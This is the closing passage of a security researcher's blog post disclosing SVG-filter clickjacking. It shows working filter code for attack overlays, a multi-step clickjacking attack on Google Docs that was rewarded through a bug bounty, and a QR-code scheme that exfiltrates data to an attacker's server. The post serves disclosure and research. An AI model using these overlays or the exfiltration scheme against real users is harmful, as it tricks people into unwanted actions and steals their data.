               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;1 1 1 0 0
                       1 1 1 0 0
                       1 1 1 0 0
                       1 1 1 1 0&#34;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>C</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- R (red text visible) --&gt;</sx-c>
<sx-t>&lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;17px&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;150px&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;100%&#34;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>redtext</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 1 0 0
                       0 0 0 0 0
                       0 0 0 0 0
                       0 0 1 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>2</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>-5</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>redtext</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>R</sx-v>
               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;1 0 0 0 0
                       1 0 0 0 0
                       1 0 0 0 0
                       1 0 0 0 1&#34;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Attack overlays --&gt;</sx-c>
<sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>R</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>end.png</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>button1.png</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>C</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>button2.png</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>checkbox.png</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>loadedGraphic</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>L</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>loadedGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>loading.png</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>dialogGraphic</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>D</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>dialogGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>
<fake-frame>
  <p>Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button primary="">Hack me</g-button></label>
  <div><div>
    <p>Hack confirmation</p>
    <p>Are you sure you&#39;d like to get hacked?</p>
    <p><label>I am 100% sure</label>
    <label for="hackmecheck2"><g-button>No</g-button></label>
    <label><g-button primary="">Yes</g-button></label>
    <span>‚åõ</span>
  </p></div></div>
  <p><label for="hackmeyes2">You have been hacked!</label></p>
  
</fake-frame>
<p><label>Show attack with transparency</label></p>

<p>Play around with this and see just how much more convincing it is as an attack. And we could easily make it better by, for example, adding some extra logic to also add hover visuals to the buttons. The demo has debug visuals for the four inputs (D, L, C, R) in the bottom left as squares to make it easier to understand what‚Äôs going on.</p>
<p>But yeah, that‚Äôs how you can make complex and long clickjacking attacks that have not been realistic with the traditional clickjacking methods.</p>
<p>I kept this example here pretty short and simple, but real-world attacks can be a lot more involved and polished.</p>
<p>In fact‚Ä¶</p>
<h2 id="the-docs-bug">The Docs bug</h2>
<p>I‚Äôve actually managed to pull off this attack against Google Docs!</p>
<p>Take a look at the demo videos <a href="https://infosec.exchange/@rebane2001/115265287713185877">here</a> (alt links: <a href="https://bsky.app/profile/rebane2001.bsky.social/post/3lzo4euxo5s2p">bsky</a>, <a href="https://twitter.com/rebane2001/status/1971213061580259814">twitter</a>).</p>
<p>What this attack does is:</p>
<ul>
<li>Makes the user click on the ‚ÄúGenerate Document‚Äù button</li>
<li>Once pressed, detects the popup and shows a textbox for the user to type a ‚Äúcaptcha‚Äù into
<ul>
<li>The textbox starts off with a gradient animation, which must be handled</li>
<li>The textbox has focus states, which must also be present in the attack visuals, so they must be detected by the background color of the textbox</li>
<li>The textbox has grey text for both a placeholder AND suggestions, which must be hidden with the technique discussed earlier</li>
</ul>
</li>
<li>Once the captcha is typed, makes the user seemingly click on a button (or press enter), which causes a suggested Docs item to be added into the textbox
<ul>
<li>This item must be detected by looking for its background color in the textbox</li>
</ul>
</li>
<li>Once the item is detected, the textbox must be hidden and another button must be shown instead
<ul>
<li>Once that button is clicked, a loading screen appears, which must be detected</li>
</ul>
</li>
<li>If the loading screen is present, or the dialog is not visible and the ‚ÄúGenerate Document‚Äù button is not present, the attack is over and the final screen must be shown</li>
</ul>
<p>In the past, individual parts of such an attack could‚Äôve been pulled off through traditional clickjacking and some basic CSS, but the entire attack would‚Äôve been way too long and complex to be realistic. With this new technique of running logic inside SVG filters, such attacks become realistic.</p>
<p>Google VRP awarded me <span>$3133.70</span> for the find. That was, of course, <a href="https://infosec.exchange/@rebane2001/115349916882356842">right before</a> they introduced a novelty bonus for new vulnerability classes. Hmph!<sup id="fnref:10"><a href="#fn:10" role="doc-noteref">10</a></sup></p>
<!--
Should be something like opening the settings, scrolling down to the desired item, selecting it, then selecting the thing on the side and typing something in.

maybe add in a loading spinner or something too that we can pixel detect

maybe it could be like generating an app password or something like that

the scrolling down could be a license agreement spoof
the typing something should be a captcha spoof


-->
<h2 id="the-qr-attack">The QR attack</h2>
<p>Something I see in online discussions often is the insistence on QR codes being dangerous. It kind of rubs me the wrong way because QR codes are not any more dangerous than links.</p>
<p>I don‚Äôt usually comment on this too much because it‚Äôs best to avoid suspicious links, and the same goes for QR codes, but it does nag me to see people make QR codes out to be this evil thing that can somehow immediately hack you.</p>
<p>I turns out though, that my SVG filters attack technique can be applied to QR codes as well!</p>
<p>The example from earlier in the blog with retyping a code becomes impractical once the user realizes they‚Äôre typing something they shouldn‚Äôt. We can‚Äôt stuff the data we exfiltrate into a link either, because an SVG filter cannot create a link.</p>
<p>But since an SVG filter can run logic and provide visual output, perhaps we could generate a QR code with a link instead?</p>
<h3 id="creating-the-qr">Creating the QR</h3>
<p>Creating a QR code within an SVG filter is easier said than done however. We can shape binary data into the shape of a QR code by using <code>feDisplacementMap</code>, but for a QR code to be scannable it also needs error correction data.</p>
<p>QR codes use <a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction">Reed-Solomon error correction</a>, which is some fun math stuff that‚Äôs a bit more advanced than a simple checksum. It does math with polynomials and stuff and that is a bit annoying to reimplement in an SVG.</p>
<p>Luckily for us, I‚Äôve faced the same problem before! Back in 2021 I was the first person<sup id="fnref:11"><a href="#fn:11" role="doc-noteref">11</a></sup> to <a href="https://www.planetminecraft.com/project/rebane-s-qr-code-generator/">make a QR code generator in Minecraft</a>, so I‚Äôve already figured out the things necessary.</p>
<p>In my build I pre-calculated some lookup tables for the error correction, and used those instead to make the build simpler - and we can do the same with the SVG filter.</p>
<p>This post is already getting pretty long, so I‚Äôll leave figuring out how this filter works as an exercise to the reader ;).</p>
<art-frame flex="" center=""><qr-demo>
<qr-gen>
  <qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter>
    <div>
        
  <qr-bit b1="" d1=""></qr-bit>
  <qr-bit b2="" d1=""></qr-bit>
  <qr-bit b3="" d1=""></qr-bit>
  <qr-bit b4="" d1=""></qr-bit>
  <qr-bit b1="" d2=""></qr-bit>
  <qr-bit b2="" d2=""></qr-bit>
  <qr-bit b3="" d2=""></qr-bit>
  <qr-bit b4="" d2=""></qr-bit>
  <qr-bit b1="" d3=""></qr-bit>
  <qr-bit b2="" d3=""></qr-bit>
  <qr-bit b3="" d3=""></qr-bit>
  <qr-bit b4="" d3=""></qr-bit>
  <qr-bit b1="" d4=""></qr-bit>
  <qr-bit b2="" d4=""></qr-bit>
  <qr-bit b3="" d4=""></qr-bit>
  <qr-bit b4="" d4=""></qr-bit>
    </div>
  </qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter>
</qr-gen>
</qr-demo><p>Hover to see QR</p></art-frame>



<p>This is a demo that displays a QR code telling you how many seconds you‚Äôve been on this page for. It‚Äôs a bit fiddly, so if it doesn‚Äôt work make sure that you aren‚Äôt using any <bad-scaling>display scaling</bad-scaling> or <bad-color>a custom color profile</bad-color>. On Windows you can toggle the <em>Automatically manage color for apps</em> setting, and on a Mac you can set the color profile to sRGB for it to work.</p>
<p>This demo <bad-phone>does not work on mobile devices</bad-phone>. And also, for the time being, <fire-fox>it only works in Chromium-based browsers</fire-fox>, but I believe it could be made to work in Firefox too.</p>
<p>Similarly, in a real attack, the scaling and color profile issues could be worked around using some JavaScript tricks or simply by implementing the filter a bit differently - this here is just a proof of concept that‚Äôs a bit rough around the edges.</p>
<p>But yeah, that‚Äôs a QR code generator built inside an SVG filter!</p>
<p>Took me a while to make, but I didn‚Äôt want to write about it just being ‚Äútheoretically possible‚Äù.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>So the attack scenario with the QR code is that you‚Äôd read pixels from a frame, process them to extract the data you want, encode them into a URL that looks something like <em>https://lyra.<span>horse</span>/?ref=c3VwZXIgc2VjcmV0IGluZm8</em> and render it as a QR code.</p>
<p>Then, you prompt the user to scan the QR code for whatever reason (eg anti-bot check). To them, the URL will seem like just a normal URL with a tracking ID or something in it.</p>
<p>Once the user opens the URL, your server gets the request and receives the data from the URL.</p>
<h2 id="and-so-on">And so on..</h2>
<p>There are so many ways to make use of this technique I won‚Äôt have time to go over them all in this post. Some examples would be reading text by using the difference blend mode, or exfiltrating data by making the user click on certain parts of the screen.</p>
<p>You could even insert data from the outside to have a fake mouse cursor inside the SVG that shows the <span><i>pointer</i> cursor</span> and reacts to fake buttons inside your SVG to make the exfiltration more realistic.</p>
<p>Or you could code up attacks with CSS and SVG where CSP doesn‚Äôt allow for any JS.</p>
<p>Anyways, this post is long as is, so I‚Äôll leave figuring out these techniques as homework.</p>
<h2 id="novel-technique">Novel technique</h2>
<p>This is the first time in my security research I‚Äôve found a completely new technique!</p>
<p>I introduced it briefly at <a href="https://youtu.be/INgS4IipEhU?t=1516">my BSides talk in September</a>, and this post here is a more in-depth overview of the technique and how it can be used.</p>
<p>Of course, you can never know 100% for sure that a specific type of attack has never been found by anyone else, but my extensive search of existing security research has come up with nothing, so I suppose I can crown myself as the researcher who discovered it?</p>
<p>Here‚Äôs some previous research I‚Äôve found:</p>
<ul>
<li><a href="https://link.springer.com/article/10.1007/s10207-018-0423-3">You click, I steal: analyzing and detecting click hijacking attacks in web pages</a>,</li>
<li><a href="https://media.blackhat.com/us-13/US-13-Stone-Pixel-Perfect-Timing-Attacks-with-HTML5-WP.pdf">Pixel Perfect Timing - Attacks with HTML5</a>,</li>
<li><a href="https://ronmasas.com/posts/the-human-side-channel">The Human Side Channel</a>
<ul>
<li>Some pretty cool clickjacking techniques, though no multi-step attacks or SVG logic.</li>
</ul>
</li>
<li><a href="https://github.com/tom-p-reichel/svg-is-turing-complete">SVG is turing-complete-ish</a>
<ul>
<li>Another example of logic gates in SVG I found after writing my blog. It‚Äôs fun because it comes with <a href="https://old.reddit.com/r/programming/comments/d4xcgs/svg_is_turing_complete/">reddit</a> and <a href="https://news.ycombinator.com/item?id=20980837">hn</a> threads - I particularly like the comment asking about whether this turing completeness is useful or just a fun fact, which got a reply confirming the latter. <span>I like turning fun facts into vulnerabilities ^^.</span></li>
<li>Note that whether SVG filters are actually turing complete is questionable because filters are implemented in constant-time and can‚Äôt run in a loop. This doesn‚Äôt mean they can‚Äôt be turing complete, but it also doesn‚Äôt prove that they are.</li>
</ul>
</li>
</ul>
<p>I don‚Äôt think <em>me</em> discovering this technique was just luck though. I have a history of seeing things such as CSS as programming languages to exploit and be creative with. It wasn‚Äôt a stretch for me to see SVG filters as a programming language either.</p>
<p>That, and my overlap between security research and creative projects - I often blur the lines between the two, which is what <a href="https://lyra.horse/antonymph/">Antonymph</a> was born out of.</p>
<p id="aws">In any case, <s-l>it feels</s-l> <span><m-m>
  <w-w>yay</w-w>
  <w-w>:3</w-w>
  <w-w>woof</w-w>
  <w-w>yippie</w-w>
  <w-w>waow</w-w>
</m-m>awesome<m-m>
  <w-w>meow</w-w>
  <w-w>awrf</w-w>
</m-m></span> <s-r>to discover</s-r> something like this.</p>

<h2 id="afterword">afterword</h2>
<p>whoa this post took such a long time for me to get done!</p>
<p>i started work on it in july, and was expecting to release it alongside <a href="https://youtu.be/INgS4IipEhU">my CSS talk</a> in september, but it has taken me so much longer than expected to actually finish this thing. i wanted to make sure it was a good in-depth post, rather than something i just get out as soon as possible.</p>
<p>unlike my previous posts, i did unfortunately have to break my trend of using no images, since i needed a few data URIs within the SVG filters for demos. still, no images anywhere else in the post, no javascript, and just 42kB (gzip) of handcrafted html/css/svg.</p>
<p>also, i usually hide a bunch of easter eggs in my post that link to stuff i‚Äôve enjoyed recently, but i have a couple links i didn‚Äôt want to include without content warnings. <a href="https://youtu.be/UBdBoWAtLNI">finding responsibility</a> is a pretty dark talk about the ethics of making sure your work won‚Äôt end up killing people, and <a href="https://youtu.be/rQHYelsNgtU">youre the one ive always wanted</a> is slightly nsfw doggyhell vent art.</p>
<p>btw i‚Äôll soon be giving talks at <a href="https://events.ccc.de/en/category/39c3/">39c3</a> and <a href="https://disobey.fi/2026/">disobey 2026</a>! the 39c3 one is titled ‚Äú<a href="https://fahrplan.events.ccc.de/congress/2025/fahrplan/event/css-clicker-training-making-games-in-a-styling-language">css clicker training</a>‚Äù and will be about css crimes and making games in css. and the disobey one is the same talk as the bsides one about using css to hack stuff and get bug bounties, but i‚Äôll make sure to throw some extra content in there to keep it fun.</p>
<p>see y‚Äôall around!!</p>
<p>&lt;3</p>
<p><em>Note: I you‚Äôre making content (articles, videos etc) based on this post, feel free to <a href="https://lyra.horse/#:~:text=socials">reach out</a> to me to ask for questions or feedback.</em></p>
<p><strong>Discuss this post on:</strong> <a href="https://twitter.com/rebane2001/status/1996581146662998516">twitter</a>, <a href="https://infosec.exchange/@rebane2001/115661669658436967">mastodon</a>, <a href="https://lobste.rs/s/omnyrf/svg_filters_clickjacking_2_0">lobsters</a></p>



  </div></div>
  </body>
</html>
